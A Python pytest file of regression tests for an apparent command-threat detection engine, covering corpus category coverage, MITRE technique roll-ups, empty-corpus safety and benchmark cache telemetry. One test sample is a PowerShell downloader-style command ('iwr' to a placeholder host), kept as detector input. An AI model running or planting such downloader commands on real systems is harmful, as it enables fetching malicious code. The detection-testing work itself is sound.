"""Feb-2026 · Data-integrity sprint regression tests.

Covers all four objectives from the sprint spec:

1. Category Coverage — populated with real values, empty-safe.
2. MITRE Technique Count — deterministic unique-technique roll-up.
3. Real Benchmark History — no synthetic trends; empty-safe.
4. Benchmark Cache — mtime-based invalidation + hit/miss telemetry.
"""
from __future__ import annotations

import time
from unittest.mock import patch

import pytest

from engine.golden_corpus import (
    GoldenRunReport, SampleResult, run_corpus,
)


# ─────────────────────────────────────────────────────────────────────
# Category Coverage + MITRE aggregation (Objective 1 + 2)
# ─────────────────────────────────────────────────────────────────────
class TestGoldenAggregation:
    def test_run_corpus_populates_category_coverage(self):
        # Use a two-sample micro-corpus to keep the test fast + deterministic.
        corpus = (
            {"id": "GC-001-baseline-cmd", "language": "cmd",
             "input": "cmd /c echo hi",
             "expected": {"verdict": "Benign"}},
            {"id": "GC-100-downloader-ps", "language": "powershell",
             "input": "iwr http://x.example/",
             "expected": {"verdict_min": "Suspicious"}},
        )
        report = run_corpus(corpus=corpus)
        assert isinstance(report.category_coverage, dict)
        assert len(report.category_coverage) >= 1
        for cat, m in report.category_coverage.items():
            assert set(m.keys()) == {"total", "passed", "pass_rate"}
            assert 0 <= m["pass_rate"] <= 100
            assert m["total"] >= 1

    def test_run_corpus_populates_mitre_technique_count(self):
        report = run_corpus()
        assert isinstance(report.mitre_technique_count, int)
        assert report.mitre_technique_count >= 0
        assert isinstance(report.mitre_technique_ids, list)
        assert len(report.mitre_technique_ids) == report.mitre_technique_count
        # Sorted + deterministic
        assert report.mitre_technique_ids == sorted(report.mitre_technique_ids)

    def test_sample_result_carries_technique_ids(self):
        # Every sample keeps its own list — enables report-level aggregation.
        report = run_corpus()
        for s in report.samples:
            assert isinstance(s.mitre_technique_ids, list)
            # Must be deterministic (sorted).
            assert s.mitre_technique_ids == sorted(s.mitre_technique_ids)


# ─────────────────────────────────────────────────────────────────────
# Empty-corpus safety (Objective 6)
# ─────────────────────────────────────────────────────────────────────
class TestEmptyCorpus:
    def test_empty_corpus_returns_empty_containers(self):
        report = run_corpus(corpus=())
        assert report.total == 0
        assert report.category_coverage == {}
        assert report.mitre_technique_count == 0
        assert report.mitre_technique_ids == []


# ─────────────────────────────────────────────────────────────────────
# Benchmark cache — mtime invalidation + telemetry (Objective 4)
# ─────────────────────────────────────────────────────────────────────
class TestBenchmarkCache:
    def _reset(self):
        from routers.benchmark import _CACHE, _invalidate_cache
        _invalidate_cache()
        _CACHE["hits"] = 0
        _CACHE["misses"] = 0

    def test_first_hit_is_miss_then_hit(self):
        from routers.benchmark import _load_cached_or_fresh, cache_stats
        self._reset()
        _load_cached_or_fresh()
        assert cache_stats()["misses"] == 1
        assert cache_stats()["hits"] == 0
        _load_cached_or_fresh()
        assert cache_stats()["misses"] == 1
        assert cache_stats()["hits"] == 1

    def test_invalidate_forces_miss(self):
        from routers.benchmark import _load_cached_or_fresh, _invalidate_cache, cache_stats
        self._reset()
        _load_cached_or_fresh()
        _load_cached_or_fresh()
        _invalidate_cache()
        _load_cached_or_fresh()
        # 2 misses total (initial + post-invalidate), 1 hit.
        s = cache_stats()
        assert s["misses"] == 2
        assert s["hits"] == 1

    def test_mtime_change_invalidates_cache(self):
        from routers.benchmark import _load_cached_or_fresh, cache_stats
        import routers.benchmark as bm
        self._reset()
        # Populate cache
        _load_cached_or_fresh()
        s1 = cache_stats()
        # Simulate a report-file mtime change → key differs → cache miss
        with patch.object(bm, "_cache_key", return_value=(999999, 1)):
            _load_cached_or_fresh()
            s2 = cache_stats()
        assert s2["misses"] == s1["misses"] + 1

    def test_cache_stats_shape(self):
        from routers.benchmark import cache_stats
        s = cache_stats()
        assert set(s.keys()) == {"hits", "misses", "hit_rate", "warm", "age_s", "key"}
        assert 0.0 <= s["hit_rate"] <= 1.0
